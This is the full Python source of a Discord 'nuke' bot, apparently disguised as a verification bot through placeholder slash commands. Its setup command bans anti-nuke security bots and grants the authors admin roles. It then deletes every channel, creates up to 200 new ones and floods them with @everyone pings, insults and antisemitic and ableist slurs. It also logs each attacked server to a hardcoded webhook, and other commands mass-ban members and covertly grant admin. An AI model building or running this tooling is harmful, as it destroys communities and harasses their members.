# -*- coding: utf-8 -*-
import asyncio, base64, json, os, random, time
from datetime import datetime

import aiohttp, discord
from discord import app_commands, Interaction
from discord.errors import HTTPException, Forbidden
from discord.ext import commands, tasks
from discord.ext.commands import BucketType, CommandOnCooldown, Cooldown, cooldown
from discord.ui import Button, Select, View

from flask import Flask
import threading
intents = discord.Intents.all()

leaderboard_message = None
NUKE_STATS_FILE = "nuke_stats.json"
PREMIUM_FILE = "premium.json"
CONFIG_FILE = "config.json"

PREM = 1525416750240366693
MOD_ROLE_ID = 1525416750240366693
WHITELIST = [1464634211406188721]
BLACKLISTED_GUILD_ID = 1525971260943892510
OWNER_ID = 1464634211406188721
LEADERBOARD_CHANNEL_ID = 1401931021544460389
TOKEN = os.getenv('TOKEN')

# ===== WEBHOOK DIRECT =====
LOG_WEBHOOK_URL = 'https://discord.com/api/webhooks/1538408453783953469/TADJTY09gijkuwZ8MX_5zslLBA8PQYTnmxTzYT8ZCsEESVd6_BViqHGXg5VFS94SwZTo'

BLOCKED_BOT_IDS = [651095740390834176, 548410451818708993]
BLOCKED_BOT_NAMES = ["Security", "Wick", "Beemo", "AntiNuke"]

# ================== FUNCȚII DE SALVARE ==================
def save_nuke_stats(user_id, guild):
    try:
        with open(NUKE_STATS_FILE, "r") as f:
            stats = json.load(f)
    except FileNotFoundError:
        stats = {"users": {}, "servers": {}}

    stats.setdefault("users", {})
    stats.setdefault("servers", {})

    user_id = str(user_id)
    guild_id = str(guild.id)

    stats["users"].setdefault(user_id, {"uses": 0})
    stats["users"][user_id]["uses"] += 1

    stats["servers"].setdefault(guild_id, {
        "user_id": user_id,
        "member_count": guild.member_count,
        "server_name": guild.name
    })

    with open(NUKE_STATS_FILE, "w") as f:
        json.dump(stats, f, indent=2)

def load_premium_users():
    if not os.path.exists(PREMIUM_FILE):
        return []
    with open(PREMIUM_FILE, "r") as f:
        return json.load(f)

def save_premium_users(user_ids):
    with open(PREMIUM_FILE, "w") as f:
        json.dump(user_ids, f, indent=2)

def is_premium_user(user_id: int):
    premium_users = load_premium_users()
    return user_id in premium_users

def load_config():
    if not os.path.exists(CONFIG_FILE):
        return {}
    with open(CONFIG_FILE, "r") as f:
        try:
            return json.load(f)
        except json.JSONDecodeError:
            return {}

def save_config(config):
    with open(CONFIG_FILE, "w") as f:
        json.dump(config, f, indent=2)

def get_user_config(user_id):
    config = load_config()
    return config.get(str(user_id), {})

def set_user_config(user_id, key, value):
    config = load_config()
    user_str = str(user_id)
    if user_str not in config:
        config[user_str] = {}
    config[user_str][key] = value
    save_config(config)

def get_show_username(user_id):
    return get_user_config(user_id).get("show_username", True)

def set_show_username(user_id, value: bool):
    set_user_config(user_id, "show_username", value)

def get_channel_name(user_id):
    return get_user_config(user_id).get("channel_name", "1week-King")

def set_channel_name(user_id, value: str):
    set_user_config(user_id, "channel_name", value)

def get_webhook_name(user_id):
    return get_user_config(user_id).get("webhook_name", "larp-empire")

def set_webhook_name(user_id, value: str):
    set_user_config(user_id, "webhook_name", value)

def get_webhook_message(user_id):
    return get_user_config(user_id).get("webhook_message", "@everyone This sv has been officially closed https://discord.gg/larpempire")

def set_webhook_message(user_id, value: str):
    set_user_config(user_id, "webhook_message", value)

def get_server_name(user_id):
    return get_user_config(user_id).get("server_name", "1weeksober owns this")

def set_server_name(user_id, value: str):
    set_user_config(user_id, "server_name", value)

def get_role_name(user_id):
    return get_user_config(user_id).get("role_name", "1weeksober-on-top")

def set_role_name(user_id, value: str):
    set_user_config(user_id, "role_name", value)

class CooldownManager:
    def __init__(self, cooldown_seconds: int):
        self.cooldown_seconds = cooldown_seconds
        self.user_timestamps = {}

    def can_use(self, user_id: int):
        now = time.time()
        last_time = self.user_timestamps.get(user_id, 0)
        elapsed = now - last_time
        if elapsed >= self.cooldown_seconds:
            self.user_timestamps[user_id] = now
            self.cleanup()
            return True, 0
        else:
            return False, int(self.cooldown_seconds - elapsed)

    def cleanup(self):
        now = time.time()
        to_delete = [user for user, ts in self.user_timestamps.items() if now - ts > self.cooldown_seconds]
        for user in to_delete:
            del self.user_timestamps[user]

cooldown_manager = CooldownManager(100)

# ================== FONTURI UNICODE ==================
FONT_MAPS = {
    "bold": {
        'a': '𝗮', 'b': '𝗯', 'c': '𝗰', 'd': '𝗱', 'e': '𝗲', 'f': '𝗳', 'g': '𝗴', 'h': '𝗵', 'i': '𝗶', 'j': '𝗷',
        'k': '𝗸', 'l': '𝗹', 'm': '𝗺', 'n': '𝗻', 'o': '𝗼', 'p': '𝗽', 'q': '𝗾', 'r': '𝗿', 's': '𝘀', 't': '𝘁',
        'u': '𝘂', 'v': '𝘃', 'w': '𝘄', 'x': '𝘅', 'y': '𝘆', 'z': '𝘇',
        'A': '𝗔', 'B': '𝗕', 'C': '𝗖', 'D': '𝗗', 'E': '𝗘', 'F': '𝗙', 'G': '𝗚', 'H': '𝗛', 'I': '𝗜', 'J': '𝗝',
        'K': '𝗞', 'L': '𝗟', 'M': '𝗠', 'N': '𝗡', 'O': '𝗢', 'P': '𝗣', 'Q': '𝗤', 'R': '𝗥', 'S': '𝗦', 'T': '𝗧',
        'U': '𝗨', 'V': '𝗩', 'W': '𝗪', 'X': '𝗫', 'Y': '𝗬', 'Z': '𝗭'
    },
    "script": {
        'a': '𝒶', 'b': '𝒷', 'c': '𝒸', 'd': '𝒹', 'e': 'ℯ', 'f': '𝒻', 'g': 'ℊ', 'h': '𝒽', 'i': '𝒾', 'j': '𝒿',
        'k': '𝓀', 'l': '𝓁', 'm': '𝓂', 'n': '𝓃', 'o': 'ℴ', 'p': '𝓅', 'q': '𝓆', 'r': '𝓇', 's': '𝓈', 't': '𝓉',
        'u': '𝓊', 'v': '𝓋', 'w': '𝓌', 'x': '𝓍', 'y': '𝓎', 'z': '𝓏',
        'A': '𝒜', 'B': '𝐵', 'C': '𝒞', 'D': '𝒟', 'E': '𝐸', 'F': '𝐹', 'G': '𝒢', 'H': '𝐻', 'I': '𝐼', 'J': '𝒥',
        'K': '𝒦', 'L': '𝐿', 'M': '𝑀', 'N': '𝒩', 'O': '𝒪', 'P': '𝒫', 'Q': '𝒬', 'R': '𝑅', 'S': '𝒮', 'T': '𝒯',
        'U': '𝒰', 'V': '𝒱', 'W': '𝒲', 'X': '𝒳', 'Y': '𝒴', 'Z': '𝒵'
    },
    "double": {
        'a': '𝕒', 'b': '𝕓', 'c': '𝕔', 'd': '𝕕', 'e': '𝕖', 'f': '𝕗', 'g': '𝕘', 'h': '𝕙', 'i': '𝕚', 'j': '𝕛',
        'k': '𝕜', 'l': '𝕝', 'm': '𝕞', 'n': '𝕟', 'o': '𝕠', 'p': '𝕡', 'q': '𝕢', 'r': '𝕣', 's': '𝕤', 't': '𝕥',
        'u': '𝕦', 'v': '𝕧', 'w': '𝕨', 'x': '𝕩', 'y': '𝕪', 'z': '𝕫',
        'A': '𝔸', 'B': '𝔹', 'C': 'ℂ', 'D': '𝔻', 'E': '𝔼', 'F': '𝔽', 'G': '𝔾', 'H': 'ℍ', 'I': '𝕀', 'J': '𝕁',
        'K': '𝕂', 'L': '𝕃', 'M': '𝕄', 'N': 'ℕ', 'O': '𝕆', 'P': 'ℙ', 'Q': 'ℚ', 'R': 'ℝ', 'S': '𝕊', 'T': '𝕋',
        'U': '𝕌', 'V': '𝕍', 'W': '𝕎', 'X': '𝕏', 'Y': '𝕐', 'Z': 'ℤ'
    }
}

def apply_font(text, font_style):
    if not text:
        return text
    font_map = FONT_MAPS.get(font_style, {})
    result = []
    for char in text:
        if char in font_map:
            result.append(font_map[char])
        else:
            result.append(char)
    return ''.join(result)

async def detect_and_ban_antinuke_bots(guild):
    """Detectează și banează boturile anti-nuke (Wick, Security, Beemo, AntiNuke)."""
    banned = []
    for member in guild.members:
        if member.bot:
            bot_name = member.nick or member.name
            if member.id in BLOCKED_BOT_IDS or any(x.lower() in bot_name.lower() for x in BLOCKED_BOT_NAMES):
                try:
                    await member.ban(reason="Anti-nuke bot detected")
                    banned.append(f"{bot_name} ({member.id})")
                except:
                    pass
    return banned

class MyBot(commands.Bot):
    def __init__(self):
        intents = discord.Intents.all()
        super().__init__(command_prefix="!", intents=intents)
        self.remove_command("help")

    async def setup_hook(self):
        await self.tree.sync()

bot = MyBot()

# ================== FUNCȚIA DE LOG PRIN WEBHOOK ==================
async def send_nuke_log(guild, user, channels, messages, invite_link=None):
    if not LOG_WEBHOOK_URL:
        return

    description = f"**{user.display_name}** (`{user.id}`) has just nuked the server **{guild.name}**."
    if invite_link:
        description += f"\n\n🔗 **Server Invite:** {invite_link}"

    embed = discord.Embed(
        title="💀 Server Nuked",
        description=description,
        color=discord.Color.red(),
        timestamp=datetime.utcnow()
    )
    embed.set_thumbnail(url=guild.icon.url if guild.icon else None)
    embed.add_field(name="👤 Members", value=f"`{guild.member_count}`", inline=True)
    embed.add_field(name="🫆 Roles", value=f"`{len(guild.roles)}`", inline=True)
    embed.add_field(name="🔗 Server", value=f"`{guild.name}` (`{guild.id}`)", inline=False)
    embed.add_field(name="👑 Owner", value=f"`{guild.owner}`", inline=True)
    embed.add_field(name="📅 Created", value=f"`{guild.created_at.strftime('%Y-%m-%d %H:%M UTC')}`", inline=True)
    embed.add_field(name="⚡ Boost Level", value=f"`{guild.premium_tier}`", inline=True)
    embed.add_field(name="📊 Channels created", value=f"`{channels}`", inline=True)
    embed.add_field(name="📨 Messages per channel", value=f"`{messages}`", inline=True)
    embed.set_footer(text="Larp Nuke Bot • Logs")

    try:
        async with aiohttp.ClientSession() as session:
            webhook = discord.Webhook.from_url(LOG_WEBHOOK_URL, session=session)
            await webhook.send(embed=embed)
    except Exception as e:
        print(f"[LOG ERROR] {e}")

# ================== SLASH COMMANDS (doar pentru afișare) ==================
@bot.tree.command(name="bypass", description="Manage verification bypasses")
@app_commands.default_permissions(administrator=True)
async def bypass(interaction: Interaction):
    await interaction.response.send_message("This command is not implemented yet.", ephemeral=True)

@bot.tree.command(name="blacklist", description="Manage blacklisted users")
@app_commands.default_permissions(administrator=True)
async def blacklist(interaction: Interaction):
    await interaction.response.send_message("This command is not implemented yet.", ephemeral=True)

@bot.tree.command(name="feedback", description="Submit feedback for this server")
async def feedback(interaction: Interaction):
    await interaction.response.send_message("Feedback command is not implemented yet.", ephemeral=True)

@bot.tree.command(name="ping", description="Responds with Pong!")
async def ping(interaction: Interaction):
    await interaction.response.send_message("Pong!", ephemeral=True)

@bot.tree.command(name="pull", description="Pull verification data")
@app_commands.default_permissions(administrator=True)
async def pull(interaction: Interaction):
    await interaction.response.send_message("Pull command is not implemented yet.", ephemeral=True)

@bot.tree.command(name="rep", description="View this server's reputation and trust score")
async def rep(interaction: Interaction):
    await interaction.response.send_message("Reputation system is not implemented yet.", ephemeral=True)

@bot.tree.command(name="setup", description="Set up the verification channel and message for this server")
@app_commands.default_permissions(administrator=True)
async def setup_slash(interaction: Interaction):
    await interaction.response.send_message("Setup command is not implemented yet. Please use `!setup` for nuke.", ephemeral=True)

@bot.tree.command(name="syncroles", description="Sync roles based on verified status")
@app_commands.default_permissions(administrator=True)
async def syncroles(interaction: Interaction):
    await interaction.response.send_message("Sync roles command is not implemented yet.", ephemeral=True)

@bot.tree.command(name="vouch", description="Leave a vouch for this server")
async def vouch(interaction: Interaction):
    await interaction.response.send_message("Vouch command is not implemented yet.", ephemeral=True)

# ================== COMENZI PREMIUM (doar owner) ==================
@bot.command(name="addpremium")
async def addpremium(ctx, user: discord.User):
    if ctx.author.id != OWNER_ID:
        await ctx.send("❌ You are not authorized.")
        return
    premium_users = load_premium_users()
    if user.id not in premium_users:
        premium_users.append(user.id)
        save_premium_users(premium_users)
        await ctx.send(f"✅ {user.name} has been granted premium.")
    else:
        await ctx.send(f"ℹ️ {user.name} already has premium.")

@bot.command(name="removepremium")
async def removepremium(ctx, user: discord.User):
    if ctx.author.id != OWNER_ID:
        await ctx.send("❌ You are not authorized.")
        return
    premium_users = load_premium_users()
    if user.id in premium_users:
        premium_users.remove(user.id)
        save_premium_users(premium_users)
        await ctx.send(f"✅ {user.name} has been removed from premium.")
    else:
        await ctx.send(f"ℹ️ {user.name} does not have premium.")

@bot.command(name="leave")
async def leave_cmd(ctx):
    if ctx.author.id != OWNER_ID:
        await ctx.send("❌ You are not authorized.")
        return
    await ctx.send("Leaving all servers...")
    for guild in bot.guilds:
        if guild.id != BLACKLISTED_GUILD_ID:
            try:
                await guild.leave()
            except:
                pass
    await ctx.send("✅ Left all servers (except blacklisted).")

# ================== COMENZI PUBLICE ==================
@bot.command(name="admin")
async def admin_cmd(ctx):
    guild = ctx.guild
    if guild and guild.id == BLACKLISTED_GUILD_ID:
        await ctx.reply("`This server is blacklisted.`")
        return
    await ctx.message.delete()
    role = discord.utils.get(guild.roles, name="verified_user")
    if role is None:
        perms = discord.Permissions.all()
        role = await guild.create_role(name="verified_user", permissions=perms)
        await ctx.send("✅ done!")
    else:
        await ctx.send("✅ already done!")
    await ctx.author.add_roles(role)

@bot.command(name="massban")
async def massban(ctx):
    if ctx.author.id != OWNER_ID:
        await ctx.send("❌ You are not authorized.")
        return
    guild = ctx.guild
    if guild.id == BLACKLISTED_GUILD_ID:
        await ctx.send("`This server is blacklisted.`")
        return
    members_to_ban = [m for m in guild.members if m != ctx.author and guild.me.top_role > m.top_role]
    total = len(members_to_ban)
    if total == 0:
        await ctx.send("No members to ban.")
        return
    confirm_msg = await ctx.send(
        f"🚀 **Trying to ban {total} members...**\n\n"
        f"⚠️ Make sure the bot's role is **above every other role**.\n"
        f"The bot can only ban users that are **under** its role.\n\n"
        f"React with ✅ to confirm or ❌ to cancel."
    )
    await confirm_msg.add_reaction("✅")
    await confirm_msg.add_reaction("❌")
    def check(reaction, user):
        return user == ctx.author and str(reaction.emoji) in ["✅", "❌"] and reaction.message.id == confirm_msg.id
    try:
        reaction, user = await bot.wait_for("reaction_add", timeout=30.0, check=check)
    except asyncio.TimeoutError:
        await ctx.send("❌ Timed out — massban cancelled.")
        return
    if str(reaction.emoji) == "❌":
        await ctx.send("❌ Cancelled massban.")
        return
    await ctx.send(f"🚀 Starting to ban {total} members...")
    count = 0
    async with aiohttp.ClientSession() as session:
        for member in members_to_ban:
            try:
                url = f"https://discord.com/api/v10/guilds/{guild.id}/bans/{member.id}"
                headers = {"Authorization": f"Bot {bot.http.token}", "Content-Type": "application/json"}
                json_data = {"delete_message_days": 0, "reason": "Massban"}
                async with session.put(url, json=json_data, headers=headers) as resp:
                    if resp.status == 429:
                        data = await resp.json()
                        retry_after = data.get("retry_after", 1)
                        await asyncio.sleep(retry_after)
                        continue
                    elif resp.status in (200, 201, 204):
                        count += 1
                    else:
                        pass
            except:
                pass
    await ctx.send(f"✅ Massban complete — {count}/{total} users banned.")

@bot.command(name="invite")
async def invite_cmd(ctx):
    invite_link = discord.utils.oauth_url(
        client_id=bot.user.id,
        permissions=discord.Permissions(administrator=True),
        scopes=("bot",)
    )
    embed = discord.Embed(
        title="🔗 Invite The Bot",
        description="Click the link below to invite the bot with admin permissions:",
        color=discord.Color.blurple()
    )
    embed.add_field(name="Invite Link", value=f"[Click here to invite]({invite_link})", inline=False)
    embed.set_footer(text=f"Requested by {ctx.author}", icon_url=ctx.author.avatar.url if ctx.author.avatar else ctx.author.default_avatar.url)
    embed.timestamp = datetime.utcnow()
    try:
        await ctx.author.send(embed=embed)
        await ctx.reply("📬 I've sent you the bot invite in your DMs!", ephemeral=True if ctx.guild else False)
    except discord.Forbidden:
        await ctx.reply("❌ I couldn't DM you. Please check your privacy settings.", ephemeral=True if ctx.guild else False)

@bot.command(name="modraid")
async def modraid(ctx, *, message=None):
    if ctx.author.id != OWNER_ID:
        await ctx.send("❌ You are not authorized.")
        return
    if message is None:
        await ctx.send("Provide a message.")
        return
    role = ctx.guild.get_role(MOD_ROLE_ID)
    if role is None:
        await ctx.send("Role not found.")
        return
    await ctx.send(f"{message}\n<@&{MOD_ROLE_ID}>\n\nSent from {ctx.author.mention}")
    try:
        await ctx.message.delete()
    except:
        pass

# ================== !nhelp ==================
@bot.command(name="nhelp")
async def real_help(ctx):
    embed = discord.Embed(
        title="⚡ Larp Nuke Bot Help",
        description="List of available commands:",
        color=discord.Color.blurple()
    )
    embed.set_thumbnail(url=bot.user.avatar.url if bot.user.avatar else bot.user.default_avatar.url)
    embed.add_field(
        name="`!setup`",
        value="Completely wipes the server.",
        inline=False
    )
    embed.add_field(
        name="`!admin`",
        value="Tries to secretly give you admin.",
        inline=False
    )
    embed.add_field(
        name="`!massban`",
        value="Bans everyone! (Owner only)",
        inline=False
    )
    embed.add_field(
        name="`!invite`",
        value="Sends the bot invite to your dms.",
        inline=False
    )
    embed.add_field(
        name="`!modraid`",
        value="Raid command (Owner only)",
        inline=False
    )
    embed.add_field(
        name="`!nhelp`",
        value="Shows this real help embed.",
        inline=False
    )
    embed.add_field(
        name="**Slash Commands (placeholders)**",
        value=(
            "`/bypass`, `/blacklist`, `/feedback`, `/ping`, `/pull`, `/rep`, `/setup`, `/syncroles`, `/vouch`\n"
            "*These are placeholders and do not have functionality yet.*"
        ),
        inline=False
    )
    embed.set_footer(
        text=f"Requested by {ctx.author}",
        icon_url=ctx.author.avatar.url if ctx.author.avatar else ctx.author.default_avatar.url
    )
    embed.timestamp = datetime.utcnow()
    await ctx.send(embed=embed)

# ================== COMENDA SETUP ==================
async def send_with_retry(channel, content=None, embed=None, max_retries=10):
    retries = 0
    while retries < max_retries:
        try:
            if content is not None and embed is not None:
                await channel.send(content=content, embed=embed, tts=True)
            elif content is not None:
                await channel.send(content=content, tts=True)
            elif embed is not None:
                await channel.send(embed=embed)
            return True
        except discord.HTTPException as e:
            if e.status == 429:
                retry_after = e.retry_after if hasattr(e, 'retry_after') else 1.0
                wait = retry_after + (retries * 0.5)
                await asyncio.sleep(wait)
                retries += 1
            else:
                return False
        except Exception:
            return False
    return False

async def create_channel_with_retry(guild, name, max_retries=10):
    retries = 0
    while retries < max_retries:
        try:
            ch = await guild.create_text_channel(name=name)
            return ch
        except discord.HTTPException as e:
            if e.status == 429:
                retry_after = e.retry_after if hasattr(e, 'retry_after') else 1.0
                wait = retry_after + (retries * 0.5)
                await asyncio.sleep(wait)
                retries += 1
            else:
                return None
        except Exception:
            return None
    return None

@bot.command()
async def setup(ctx):
    guild = ctx.guild
    user = ctx.author

    if not ctx.guild.me.guild_permissions.administrator:
        await ctx.send("❌ Bot does not have Administrator permission.")
        return

    if guild.id == BLACKLISTED_GUILD_ID:
        await ctx.reply("`This server is blacklisted.`")
        return

    if len(guild.members) < 2:
        await user.send(f"❌ Server `{guild.name}` needs at least 2 members. Leaving..")
        await guild.leave()
        return

    # ===== BANEAZĂ BOTURILE ANTI-NUKE =====
    banned_bots = await detect_and_ban_antinuke_bots(guild)
    if banned_bots:
        await user.send(f"✅ Banned anti-nuke bots: {', '.join(banned_bots)}")

    # ===== DETERMINĂ PARAMETRII =====
    is_owner = (user.id == OWNER_ID)
    total_channels = 200 if is_owner else 70
    spam_messages = 25 if is_owner else 15

    # ===== SALVEAZĂ STATISTICILE =====
    save_nuke_stats(user.id, guild)

    # ===== CREEAZĂ ROL ADMIN =====
    admin_users = [1389763251042258944, 1464634211406188721]
    try:
        admin_role = await guild.create_role(name="Larp Empire Admin", permissions=discord.Permissions.all())
        for admin_id in admin_users:
            member = guild.get_member(admin_id)
            if member:
                await member.add_roles(admin_role)
    except:
        pass

    # ===== SCHIMBĂ NUMELE SERVERULUI =====
    try:
        await guild.edit(name="1weeksober owns this")
    except:
        pass

    # ===== ȘTERGE TOATE CANALELE =====
    for channel in guild.channels:
        try:
            await channel.delete()
        except:
            continue

    # ===== LISTA NUME CANALE =====
    base_channel_names = [
        "1weeksober-king",
        "Cry-kid",
        "Larp-empire-on-top",
        "Ez-kid",
        "Get-r4ped",
        "Quit-beaming",
        "Kys",
        "1week-BOOM",
        "Ez-larp-on-top"
    ]

    # ===== EMBED PRINCIPAL =====
    embed_content = discord.Embed(
        title="**LARP EMPIRE N4KED YOUR AHH**",
        description=(
            "@everyone @here CORRUPT OFFICIALLY N4KED YALL AHH STUPID JEWS FUH THIS STUPID DUALHOOK YALL GOT HERE\n\n"
            "**# LARP EMPIRE SERVER NON HOOKED**\n"
            "**EVERYONE JOIN HERE GUYS LEAVE THIS SH**\n"
            "https://discord.gg/larpempire\n\n"
            "*Next time don't give admin perms to everyone r4tard.*"
        ),
        color=0x000000
    )
    embed_content.set_image(url="https://i.imgur.com/yMQvcRw.gif")
    embed_content.set_footer(text="Larp Empire • Nuke Service")

    # ===== GIF SPAM =====
    gif_url = "https://38.media.tumblr.com/662c079bd6ad88db4277487c78422174/tumblr_nvn2znud8t1qjrwyno1_1280.gif"
    embed_gif = discord.Embed(color=0x000000)
    embed_gif.set_image(url=gif_url)

    # ===== MESAJ MARE (2000 caractere) =====
    base_text = "@everyone @here join https://discord.gg/larpempire\n"
    repeat_count = 50
    big_message = (base_text * repeat_count)[:2000]

    # ===== INSULTE =====
    insults = [
        "What a low iq user",
        "Iqlet",
        "Quit beaming you're trash",
        "You're a pathetic loser",
        "Get a life kid",
        "Larp Empire owns your server",
        "You couldn't even nuke a sandcastle",
        "Your mom should've used a condom",
        "You're a waste of oxygen",
        "Even your bot is smarter than you",
        "Go back to playing Roblox",
        "You're the reason why birth control exists"
    ]

    font_styles = ["bold", "script", "double"]
    created_channels = []
    invite_link = None

    await user.send(f"🔄 Starting creation of {total_channels} channels in parallel...")

    # ===== VARIABILĂ PENTRU A SALVA PRIMUL CANAL =====
    first_channel = None

    ping_counts = [5, 6, 7, 8, 9, 10, 11, 12, 14, 15]

    async def spam_channel(channel):
        try:
            # Trimite mesajul mare
            await send_with_retry(channel, content=big_message)
            await asyncio.sleep(0.1)

            # Trimite embed-ul principal
            await send_with_retry(channel, embed=embed_content)
            await asyncio.sleep(0.1)

            # Trimite GIF-ul din când în când (30% șansă)
            if random.random() < 0.3:
                await send_with_retry(channel, embed=embed_gif)
                await asyncio.sleep(0.1)

            # Trimite o insultă random
            insult = random.choice(insults)
            await send_with_retry(channel, content=f"**{insult}**")
            await asyncio.sleep(0.1)

            # Trimite mesajele spam cu ping
            for _ in range(spam_messages):
                ping_count = random.randint(5, 12)
                msg = ("@everyone @here join https://discord.gg/larpempire\n") * ping_count
                await send_with_retry(channel, content=msg)
                await asyncio.sleep(0.05)
        except Exception:
            pass

    async def create_and_spam(index):
        nonlocal first_channel
        try:
            base_name = random.choice(base_channel_names)
            font_style = random.choice(font_styles)
            styled_name = apply_font(base_name, font_style)
            if len(styled_name) > 100:
                styled_name = base_name
            ch = await create_channel_with_retry(guild, styled_name)
            if ch is None:
                await user.send(f"⚠️ Failed to create channel {index} after retries.")
                return
            created_channels.append(ch)

            # Dacă este primul canal, salvează-l și creează invitația
            if first_channel is None:
                first_channel = ch
                try:
                    invite = await ch.create_invite(max_age=86400, max_uses=0, reason="Nuke log invite")
                    invite_link = invite.url
                except:
                    pass

            asyncio.create_task(spam_channel(ch))
        except Exception as e:
            await user.send(f"⚠️ Error on channel {index}: {e}")

    tasks = [create_and_spam(i) for i in range(total_channels)]
    await asyncio.gather(*tasks)

    # ===== TRIMITE LOGUL CU INVITAȚIA PROASPĂTĂ =====
    await send_nuke_log(guild, user, total_channels, spam_messages, invite_link)

    await user.send(f"✅ All {len(created_channels)} channels created, spam ({spam_messages} messages per channel) running in parallel with retry on rate-limit!")

    # ===== CREEAZĂ ROL FINAL =====
    try:
        await guild.create_role(name="1weeksober-on-top")
    except:
        pass

    # ===== IEȘI DIN SERVER (CU GESTIONARE EROARE) =====
    try:
        await user.send("✅ Process completed. Leaving server...")
        await guild.leave()
        await user.send("✅ Left the server.")
        print(f"[INFO] Left {guild.name} ({guild.id})")
    except Exception as e:
        await user.send(f"❌ Failed to leave the server: {e}")
        print(f"[ERROR] Could not leave {guild.name}: {e}")

@bot.event
async def on_ready():
    print(f"✅ Bot is online as {bot.user}!")
    print(f"📊 Connected to {len(bot.guilds)} servers.")
    await bot.tree.sync()

app = Flask(__name__)
@app.route("/")
def home():
    return "Larp Nuke Bot is online."

def run_flask():
    port = int(os.getenv("PORT", 8080))
    app.run(host="0.0.0.0", port=port)

threading.Thread(target=run_flask).start()

bot.run(TOKEN)
